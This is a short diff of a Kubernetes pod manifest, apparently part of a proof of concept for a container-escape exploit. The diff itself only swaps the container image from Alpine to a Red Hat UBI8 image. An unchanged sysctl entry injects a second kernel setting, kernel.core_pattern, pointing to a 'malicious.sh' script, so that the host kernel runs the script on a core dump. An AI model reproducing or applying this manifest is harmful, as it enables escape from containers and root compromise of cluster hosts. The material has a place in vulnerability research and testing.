@@ -8,6 +8,6 @@ spec:
    - name: kernel.shm_rmid_forced
      value: "1+kernel.core_pattern=|/var/lib/containers/storage/overlay/3ef1281bce79865599f673b476957be73f994d17c15109d2b6a426711cf753e6/diff/tmp/malicious.sh #"
   containers:
-  - name: alpine
-    image: alpine:latest
+  - name: ubi8
+    image: registry.access.redhat.com/ubi8/ubi:8.5-236
     command: ["tail", "-f", "/dev/null"]
